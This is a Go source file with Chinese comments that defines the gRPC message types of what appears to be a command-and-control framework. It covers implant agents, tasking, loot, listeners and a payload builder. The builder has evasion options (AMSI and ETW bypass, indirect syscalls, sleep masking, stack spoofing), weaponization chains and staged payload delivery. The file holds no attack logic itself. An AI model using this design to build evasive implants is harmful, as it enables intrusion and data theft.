// Package aegispb 定义 Operator ↔ Server 的 gRPC 消息和服务接口。
// 手写版本，替代 protoc 生成的代码。
package aegispb

// === Agent 信息 ===

// AgentInfo Agent 信息。
type AgentInfo struct {
	ID           string
	Hostname     string
	OS           string
	Arch         string
	Username     string
	PID          int32
	IP           string
	State        string
	FirstSeen    int64
	LastHeartbeat int64
	FailCount    int32
	ProfileName  string
	Transport    string
	Integrity    string
	KillDate     int64
}

// === Task 信息 ===

// TaskInfo 任务信息。
type TaskInfo struct {
	ID        string
	AgentID   string
	Command   string
	Args      string
	Status    string // pending/dispatched/success/failed
	Priority  int32
	CreatedAt int64
	Result    string
	ExitCode  int32
	AuditTag  string
	Duration  string
}

// === Event 信息 ===

// EventInfo 事件信息。
type EventInfo struct {
	ID        string
	Type      string
	Timestamp int64
	AgentID   string
	TaskID    string
	Source    string
	Data      map[string]string
}

// === Operator 信息 ===

// OperatorInfo 操作员信息。
type OperatorInfo struct {
	ID        string
	Name      string
	Role      string // admin / operator / observer
	Connected bool
	LastSeen  int64
	IPAddress string
}

// === Listener 信息 ===

// ListenerInfo Listener 信息。
type ListenerInfo struct {
	ID          string
	Name        string
	Protocol    string // http/https/mtls/dns/named_pipe/wireguard
	Host        string
	Port        int32
	Running     bool
	Connections int32
}

// === Loot 信息 ===

// LootInfo Loot 信息。
type LootInfo struct {
	ID        string
	AgentID   string
	LootType  string
	Filename  string
	Size      int64
	CreatedAt int64
	Content   string // base64 for binary
}

// === Profile 信息 ===

// ProfileInfo Profile 信息。
type ProfileInfo struct {
	Name        string
	Description string
	Active      bool
	SleepSec    int32
	JitterPct   int32
	UserAgent   string
	Headers     map[string]string
}

// === Server 信息 ===

// ServerInfo Server 信息。
type ServerInfo struct {
	Version        string
	Uptime         int64
	AgentCount     int32
	OperatorCount  int32
	ListenerCount  int32
	ActiveProfile  string
}

// === Build 配置 ===

// BuildConfig Payload 构建配置。
type BuildConfig struct {
	OS                string // windows/linux
	Arch              string // amd64/arm64
	Format            string // exe/shared/svc/shellcode
	Listener          string // listener name
	LHost             string // callback host/IP (e.g. "192.168.1.100")
	LPort             int32  // callback port (e.g. 8443)
	Garble            bool
	SleepMask         bool
	IndirectSyscalls  bool
	Profile           string // malleable profile name
	Jitter            int32
	Sleep             int32
	KillDate          string
	AMSI              bool
	ETW               bool
	StackSpoof        bool
	TLSFingerprint    string // utls client ID
	Stage             string // "" (stageless) / "stage1" / "stage2"
}

// BuildResult 构建结果。
type BuildResult struct {
	Path   string
	Size   int64
	SHA256 string
	Binary []byte // inline binary for small payloads
}

// === Weaponize ===

// WeaponizeRequest Weaponize 请求。
type WeaponizeRequest struct {
	Chain      string            // "pe2shc" / "simpleloader" / "lnk"
	InputPath  string
	OutputPath string
	Options    map[string]string
}

// WeaponizeResult Weaponize 结果。
type WeaponizeResult struct {
	OutputPath string
	Size       int64
	SHA256     string
}

// === Request/Response 对 ===

// ListAgentsRequest 列出 Agent。
type ListAgentsRequest struct{}

// ListAgentsResponse 列出 Agent 响应。
type ListAgentsResponse struct {
	Agents []*AgentInfo
}

// GetAgentRequest 获取 Agent 详情。
type GetAgentRequest struct {
	ID string
}

// GetAgentResponse 获取 Agent 响应。
type GetAgentResponse struct {
	Agent *AgentInfo
}

// KillAgentRequest 杀死 Agent。
type KillAgentRequest struct {
	ID string
}

// KillAgentResponse 杀死 Agent 响应。
type KillAgentResponse struct {
	Success bool
}

// CreateTaskRequest 创建任务。
type CreateTaskRequest struct {
	AgentID  string
	Command  string
	Args     string
	Priority int32
	Timeout  int32
	AuditTag string
}

// CreateTaskResponse 创建任务响应。
type CreateTaskResponse struct {
	Task *TaskInfo
}

// GetTaskRequest 获取任务。
type GetTaskRequest struct {
	ID string
}

// GetTaskResponse 获取任务响应。
type GetTaskResponse struct {
	Task *TaskInfo
}

// ListTasksRequest 列出任务。
type ListTasksRequest struct {
	AgentID string // empty = all agents
	Status  string // empty = all states
}

// ListTasksResponse 列出任务响应。
type ListTasksResponse struct {
	Tasks []*TaskInfo
}

// GeneratePayloadRequest 生成 Payload。
type GeneratePayloadRequest struct {
	Config *BuildConfig
}

// GeneratePayloadResponse 生成 Payload 响应。
type GeneratePayloadResponse struct {
	Result *BuildResult
}

// SubscribeEventsRequest 订阅事件。
type SubscribeEventsRequest struct {
	Types []string // empty = subscribe all
}

// StartListenerRequest 启动 Listener。
type StartListenerRequest struct {
	Name     string
	Protocol string
	Host     string
	Port     int32
	Options  map[string]string
}

// StartListenerResponse 启动 Listener 响应。
type StartListenerResponse struct {
	Listener *ListenerInfo
}

// StopListenerRequest 停止 Listener。
type StopListenerRequest struct {
	ID string
}

// StopListenerResponse 停止 Listener 响应。
type StopListenerResponse struct {
	Success bool
}

// ListListenersRequest 列出 Listener。
type ListListenersRequest struct{}

// ListListenersResponse 列出 Listener 响应。
type ListListenersResponse struct {
	Listeners []*ListenerInfo
}

// ListOperatorsRequest 列出操作员。
type ListOperatorsRequest struct{}

// ListOperatorsResponse 列出操作员响应。
type ListOperatorsResponse struct {
	Operators []*OperatorInfo
}

// RegisterOperatorRequest 注册操作员。
type RegisterOperatorRequest struct {
	Name string
	Role string
}

// RegisterOperatorResponse 注册操作员响应。
type RegisterOperatorResponse struct {
	Operator  *OperatorInfo
	CertPEM   []byte // client certificate for mTLS
	KeyPEM    []byte // private key
	CACertPEM []byte // CA certificate
}

// ListLootRequest 列出 Loot。
type ListLootRequest struct {
	AgentID  string
	LootType string
}

// ListLootResponse 列出 Loot 响应。
type ListLootResponse struct {
	Loot []*LootInfo
}

// GetServerInfoRequest 获取服务器信息。
type GetServerInfoRequest struct{}

// GetServerInfoResponse 获取服务器信息响应。
type GetServerInfoResponse struct {
	Info *ServerInfo
}

// ListProfilesRequest 列出 Profile。
type ListProfilesRequest struct{}

// ListProfilesResponse 列出 Profile 响应。
type ListProfilesResponse struct {
	Profiles []*ProfileInfo
}

// SetActiveProfileRequest 设置活跃 Profile。
type SetActiveProfileRequest struct {
	Name string
}

// SetActiveProfileResponse 设置活跃 Profile 响应。
type SetActiveProfileResponse struct {
	Success bool
}

// WeaponizeResponse Weaponize 响应。
type WeaponizeResponse struct {
	Result *WeaponizeResult
}

// === Stage2 注册（分离式交付） ===

// Stage2Registration Stage2 注册信息。
type Stage2Registration struct {
	ID          string // "s2-xxxx"
	ExternalURL string // 外部下载地址
	AESKeyHex   string // AES-GCM 密钥 hex
}

// RegisterStage2Request 注册 Stage2。
type RegisterStage2Request struct {
	ExternalURL string
	AESKeyHex   string
}

// RegisterStage2Response 注册 Stage2 响应。
type RegisterStage2Response struct {
	Stage2      *Stage2Registration
}
